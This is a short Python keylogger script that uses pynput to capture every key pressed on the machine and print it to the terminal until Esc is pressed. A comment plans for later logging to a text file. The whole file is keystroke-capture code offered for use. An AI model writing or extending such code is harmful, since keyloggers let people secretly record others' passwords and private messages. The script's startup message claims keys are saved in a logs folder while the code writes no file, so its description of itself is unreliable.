#!/usr/bin/env python3
#
# Keylogger coded by Jonathan Houle
# 20 Oct. 2022

from pynput import keyboard
import getpass
from datetime import datetime

# Constants for creating the text file
CURRENT_OS_USER = getpass.getuser()
CURRENT_TIME_OBJECT = datetime.now()
CURRENT_TIME_STRING = CURRENT_TIME_OBJECT.strftime("%d-%b-%Y-%H:%M:%S")

FILENAME = "keylogger_" + CURRENT_OS_USER + "_" + CURRENT_TIME_STRING

# Starting message
print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + FILENAME)

# Print keys input in terminal (Later, in a text file)
def on_pressing_key(key):
    try:
        print("{0}".format(key))
    except AttributeError:
        print("{0}".format(key))

# To stop the listener
def on_key_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Collecting events until released
with keyboard.Listener(
    on_press=on_pressing_key,
    on_release=on_key_release) as listener:
    listener.join()
